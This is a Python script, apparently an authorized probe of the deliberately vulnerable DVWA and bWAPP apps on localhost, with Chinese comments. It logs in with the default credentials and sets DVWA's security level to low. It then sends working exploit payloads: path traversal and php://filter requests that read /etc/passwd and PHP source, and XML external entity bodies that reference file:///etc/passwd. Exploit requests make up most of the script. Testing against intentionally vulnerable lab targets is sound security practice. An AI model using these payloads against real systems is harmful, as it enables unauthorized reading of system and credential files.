#!/usr/bin/env python3
# loop3 t4 B 档 probe1: DVWA 会话/安全级别 + B1 LFI 初测 + bWAPP 会话/XXE 初测
# 只读为主；XXE 关卡本轮先只做「解析器行为探测」不写库（OOB 由 probe2 做）
import re, json, time, sys, base64
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
OUT = {"steps": [], "ts": __import__("datetime").datetime.now().isoformat()}


def log(*a):
    print(*a, flush=True)


def rec(name, **kw):
    d = {"step": name, **kw}
    OUT["steps"].append(d)
    log(f"--- {name}: " + json.dumps({k: (v[:300] if isinstance(v, str) else v) for k, v in kw.items()}, ensure_ascii=False)[:900])
    return d


def tok(html):
    m = re.search(r"name='user_token' value='([^']+)'", html) or re.search(r'name="user_token" value="([^"]+)"', html)
    return m.group(1) if m else None


# ---------- DVWA ----------
S = requests.Session()
S.headers["User-Agent"] = "loop3-t4-probe/1.0 (authorized local lab)"
r = S.get(BASE + "/dvwa/login.php", timeout=20)
rec("dvwa_get_login", status=r.status_code, token_len=len(tok(r.text) or ""), bytes=len(r.content))
t = tok(r.text)
r = S.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": t},
           allow_redirects=False, timeout=20)
rec("dvwa_post_login", status=r.status_code, location=r.headers.get("Location"))
time.sleep(GAP)
r = S.get(BASE + "/dvwa/index.php", timeout=20)
rec("dvwa_index", status=r.status_code, logged_in=("Welcome :: Damn Vulnerable Web Application" in r.text), phpssid=S.cookies.get("PHPSESSID"))
time.sleep(GAP)

# security level -> low
r = S.get(BASE + "/dvwa/security.php", timeout=20)
t2 = tok(r.text)
m = re.search(r"<option value=['\"](\w+)['\"]([^>]*)>", r.text)
rec("dvwa_security_page", status=r.status_code, token_present=bool(t2), cur=re.findall(r"<em>(\w+)</em>", r.text)[:3])
time.sleep(GAP)
data = {"security": "low", "seclev_submit": "Submit"}
if t2:
    data["user_token"] = t2
r = S.post(BASE + "/dvwa/security.php", data=data, allow_redirects=False, timeout=20)
rec("dvwa_set_security_low", status=r.status_code)
time.sleep(GAP)
r = S.get(BASE + "/dvwa/security.php", timeout=20)
rec("dvwa_security_after", status=r.status_code, level_hint=re.findall(r"Security Level[^<]*<em>(\w+)</em>", r.text)[:2] or re.findall(r"<em>(\w+)</em>", r.text)[:3])

# --- B1: LFI ---
def fi(payload, tag):
    time.sleep(GAP)
    r = S.get(BASE + "/dvwa/vulnerabilities/fi/", params={"page": payload}, timeout=20)
    body = r.text
    return rec(tag, status=r.status_code, bytes=len(r.content),
               has_root=("root:x:0:0" in body), has_daemon=("daemon:" in body),
               echoed_payload=(payload in body),
               head=body[:200].replace("\n", " "))

fi("include.php", "b1_baseline_include")
fi("../../../../../../etc/passwd", "b1_traversal_etc_passwd")
fi("../../../../../../etc/passwd_loop3_nonexistent", "b1_traversal_negative_control")
fi("php://filter/convert.base64-encode/resource=index.php", "b1_phpfilter_src_index")
time.sleep(GAP)
r = S.get(BASE + "/dvwa/vulnerabilities/fi/", params={"page": "php://filter/convert.base64-encode/resource=index.php"}, timeout=20)
b64 = re.findall(r"[A-Za-z0-9+/=]{80,}", r.text)
decoded = ""
if b64:
    try:
        decoded = base64.b64decode(b64[0]).decode("utf-8", "replace")
    except Exception as e:
        decoded = f"decode-fail {e}"
rec("b1_phpfilter_decoded", decoded_len=len(decoded), is_php=("<?php" in decoded), sample=decoded[:120].replace("\n", " "))
time.sleep(GAP)
r = S.get(BASE + "/dvwa/vulnerabilities/fi/", params={"page": "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd"}, timeout=20)
b64b = re.findall(r"[A-Za-z0-9+/=]{40,}", r.text)
dec2 = ""
if b64b:
    try:
        dec2 = base64.b64decode(b64b[0]).decode("utf-8", "replace")
    except Exception as e:
        dec2 = f"decode-fail {e}"
rec("b1_phpfilter_passwd", has_root=("root:x:0:0" in dec2), sample=dec2[:100].replace("\n", " "))
fi("/etc/passwd", "b1_absolute_path")

# ---------- bWAPP ----------
B = requests.Session()
B.headers["User-Agent"] = "loop3-t4-probe/1.0 (authorized local lab)"
r = B.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": "0", "form": "submit"},
           allow_redirects=False, timeout=20)
rec("bwapp_login", status=r.status_code, location=r.headers.get("Location"),
    phpssid=B.cookies.get("PHPSESSID"), seclev_cookie=B.cookies.get("security_level"))
time.sleep(GAP)
r = B.get(BASE + "/bWAPP/portal.php", timeout=20)
rec("bwapp_portal", status=r.status_code, is_portal=("bWAPP - Portal" in r.text))
time.sleep(GAP)
r = B.get(BASE + "/bWAPP/xxe-1.php", timeout=20)
rec("bwapp_xxe1_exists", status=r.status_code, is_xxe_page=("XML External Entity Attacks" in r.text), bytes=len(r.content))

# XXE 解析器行为探测（零写入）：把 login 指向不存在用户，看是否仍写
def xxe(body, tag, seclev=None):
    time.sleep(GAP)
    if seclev is not None:
        B.cookies.set("security_level", str(seclev), domain="127.0.0.1", path="/")
    r = B.post(BASE + "/bWAPP/xxe-2.php", data=body.encode(),
               headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=25)
    return rec(tag, status=r.status_code, resp=r.text[:200].replace("\n", " "), seclev_cookie=B.cookies.get("security_level"))

xxe('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY hello "loop3canary">]><reset><login>nonexistent_loop3</login><secret>&hello;</secret></reset>', "b2_internal_entity_probe_low", 0)
xxe('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><reset><login>nonexistent_loop3</login><secret>&xxe;</secret></reset>', "b2_file_entity_probe_low", 0)
xxe('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent_loop3_zzz">]><reset><login>nonexistent_loop3</login><secret>&xxe;</secret></reset>', "b2_file_entity_missing_control_low", 0)

print(json.dumps({"rc": "ok", "steps": len(OUT["steps"])}))
with open("/tmp/loop3-t4-probe1.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
